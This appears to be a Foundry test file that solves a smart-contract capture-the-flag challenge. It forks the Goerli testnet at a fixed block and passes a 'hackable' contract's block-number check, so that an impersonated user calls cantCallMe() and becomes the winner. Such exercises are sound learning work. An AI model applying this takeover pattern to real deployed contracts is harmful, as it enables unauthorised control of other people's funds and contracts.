// SPDX-License-Identifier: Unlicense
pragma solidity ^0.8.19;

import "../src/Hackable/Hackable.sol";
import "forge-std/Test.sol";
import "forge-std/console.sol";

contract HackableTest is Test {
    address alice;
    address contractAddress = 0x445D0FA7FA12A85b30525568DFD09C3002F2ADe5;

    function setUp() public {
        string memory RPC = vm.envString("GOERLI_RPC_URL");
        vm.createSelectFork(RPC, 7335645);
        alice = makeAddr("alice");
    }

    function testTakeOwnership() public {
        hackable hack = hackable(payable(contractAddress));
        uint256 mod = hack.mod();
        uint256 lastXDigits = hack.lastXDigits();
        console.log(mod);
        console.log(lastXDigits);
        assertEq(block.number % mod, lastXDigits);
        vm.prank(alice);
        hack.cantCallMe();

        assertEq(hack.winner(), alice);
        assertEq(hack.done(), true);
    }
}
